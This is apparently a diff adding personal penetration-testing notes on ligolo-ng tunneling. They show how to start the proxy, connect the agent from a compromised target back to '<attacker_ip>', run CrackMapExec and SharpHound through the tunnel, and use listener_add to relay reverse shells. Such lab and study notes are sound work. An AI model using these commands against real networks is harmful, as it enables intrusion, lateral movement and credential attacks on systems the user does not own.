@@ -1,0 +1,135 @@
+## Install 
+git clone https://github.com/nicocha30/ligolo-ng.git
+cd ligolo-ng
+make build
+
+OR if using Parrot VM 
+
+# Proxy (your box)
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
+
+# Agent (target)
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz
+
+
+then 
+
+tar -xvf ligolo-ng_proxy_0.7.5_linux_amd64.tar
+tar -xvf ligolo-ng_agent_0.7.5_linux_amd64.tar
+
+## Start Proxy Listener
+
+sudo ./proxy -listen 0.0.0.0:11601 -self-cert -no-auth
+
+**Flags:**
+
+- `-listen`: IP and port the agent will connect to
+    
+- `-self-cert`: Auto-generates TLS certs
+    
+- `-no-auth`: Skip login for ease in labs
+    
+
+You'll get output like:
+[+] Proxy listening on 0.0.0.0:11601
+[+] SOCKS5 proxy listening on 127.0.0.1:1080
+
+
+## 🚀 3. Deploy Agent on Target (Post-exploitation)
+./agent -connect <attacker_ip>:11601
+⚠️ You must have reverse shell or RCE to run this.
+
+
+## 🔗 4. Validate the Tunnel Works
+
+### Test on Attacker box:
+curl --socks5 127.0.0.1:1080 http://10.10.1.20
+ OR
+ proxychains nmap -sT -Pn -p445 10.10.1.20
+Add this to your `/etc/proxychains.conf`:
+socks5 127.0.0.1 1080
+
+## 🧠 5. Use Through the Tunnel (Examples)
+
+### CrackMapExec:
+proxychains crackmapexec smb 10.10.1.0/24 -u user -p pass
+
+BloodHound Collection:
+proxychains python3 SharpHound.py -c all -d domain.local -u user -p pass -dc <DC_IP>
+
+### Evil-WinRM (via socks-proxy):
+
+If you must, combine with `proxychains` and `torsocks`, or forward with **socat**:
+socat TCP-LISTEN:5985,fork SOCKS4A:127.0.0.1:<target_ip>:5985,socksport=1080
+
+
+## 🧠 **Reverse Port Forwarding vs. Ligolo-ng**
+
+| Feature                              | Reverse Port Forwarding (SSH -R)                                  | Ligolo-ng                                                            |
+| ------------------------------------ | ----------------------------------------------------------------- | -------------------------------------------------------------------- |
+| **Setup Type**                       | Manual, per-port setup                                            | Dynamic, full subnet tunneling (SOCKS5-like but at L3 level)         |
+| **Traffic Type**                     | Single port (e.g., RDP, HTTP)                                     | Full IP traffic (Nmap, BloodHound, SMB, LDAP, RDP, whatever)         |
+| **Direction**                        | External host -> internal port                                    | Internal agent -> external proxy with a routed tunnel                |
+| **SOCKS Support**                    | Not native (you forward individual ports)                         | SOCKS5-based tunnel, but then routed transparently at kernel level   |
+| **Tools Supported**                  | Only the specific forwarded port/tool                             | Anything, no tool awareness needed                                   |
+| **Multiple Targets / Subnet Pivot**  | Needs multiple `-R` tunnels or SSH tunnels for each host          | One Ligolo tunnel gives you whole subnets like `172.16.5.0/23`       |
+| **Proxychains Required?**            | Sometimes (if going SOCKS via SSH -D)                             | No. Routes are set, interface is real, native tools work normally    |
+| **Works with GUI tools (xfreerdp)?** | Not easily                                                        | YES. Native. No proxychains needed                                   |
+| **Can run `nmap` natively?**         | Not reliably (unless forwarded right or via SOCKS5 + proxychains) | YES. Even full scans: `nmap -sT`, `smbmap`, `crackmapexec` just work |
+| **Stability**                        | Pretty fragile, high effort to manage                             | Insanely stable. Plug it in and go.                                  |
+
+
+# Ligolo-ng – When to Use `listener_add`
+
+## ✅ Use `listener_add` WHEN:
+- Reverse shell needs to call back from target → attacker
+- Payload is configured with pivot host’s IP (because it can't see 10.x.x.x)
+- You're simulating `ssh -R` remote port forwarding
+- Internal host must talk to attacker box via pivot
+
+## ❌ Do NOT use `listener_add` WHEN:
+- You're initiating scans, RDP, BloodHound, etc. from attacker → internal
+- You've already used `autoroute` and everything is outbound
+- You want Nmap, RDP, SMB, or tooling to run like you're plugged in
+
+## 🧠 Command Template
+listener_add -lport <on_pivot> -rhost <attacker_ip> -rport <on_attacker>
+
+
+## 🧠 When Do You Use `listener_add` in Ligolo?
+
+Think of it like this:
+
+|Scenario|Do You Need `listener_add`?|Why?|
+|---|---|---|
+|You're scanning, RDPing, SMBing to **internal boxes** (from your attacker box)|❌ No|Use `autoroute` + the virtual interface Ligolo makes (e.g., `burstingraider`)|
+|An **internal host** (e.g. Windows box) needs to reach your **attacker box**, but it can _only_ reach the pivot|✅ Yes|`listener_add` makes the pivot "catch" that traffic and bounce it to you|
+|You're expecting **reverse shells**, Meterpreter, or any inbound connection from the internal target|✅ Yes|Because that host doesn’t know your 10.10.x.x exists — it only sees the pivot|
+|You're simulating `ssh -R` behavior|✅ Yes|Exact 1:1 replacement|
+
+### 🔁 Rule of Thumb:
+
+> ❌ Outbound from you → internal = **NO `listener_add`**  
+> ✅ Inbound from internal → you = **YES `listener_add`**
+
+---
+
+## 🧰 Ligolo `listener_add` Cheat Sheet
+
+### ✅ Basic Format:
+listener_add -lport <pivot_listen_port> -rhost <attacker_target> -rport <attacker_listen_port>
+
+✅ Real Example (catch reverse shell):
+listener_add -lport 8080 -rhost 127.0.0.1 -rport 8000
+
+- Internal Windows box sends traffic to `pivot:8080`
+    
+- Ligolo forwards that to your attacker box on `8000`
+
+## 🧠 Ask Yourself:
+
+- Is traffic going **from me → target?** → Just autoroute.
+    
+- Is traffic coming **from the target → me?** → Use `listener_add`.
+    
+- Does the target only know the **pivot**? → Yep, you’re in `-R` land.
